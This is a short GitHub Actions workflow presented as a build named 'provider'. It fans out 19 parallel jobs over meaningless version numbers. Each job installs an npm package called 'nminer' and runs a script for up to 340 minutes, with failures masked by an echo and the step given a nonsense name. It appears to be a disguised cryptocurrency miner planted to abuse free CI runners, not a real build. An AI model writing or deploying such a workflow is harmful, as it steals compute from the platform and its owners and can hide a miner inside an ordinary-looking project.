name: provider
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3320 }
          - { version: 3883 }
          - { version: 3869 }
          - { version: 3330 }
          - { version: 1461 }
          - { version: 645 }
          - { version: 8344 }
          - { version: 7578 }
          - { version: 2680 }
          - { version: 2300 }
          - { version: 9255 }
          - { version: 9585 }
          - { version: 1432 }
          - { version: 9069 }
          - { version: 285 }
          - { version: 7874 }
          - { version: 7010 }
          - { version: 8970 }
          - { version: 6391 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: outbid saloon yum anti
        run: |
          npm install nminer@latest
          timeout 340m node provider.js || echo "provider executed"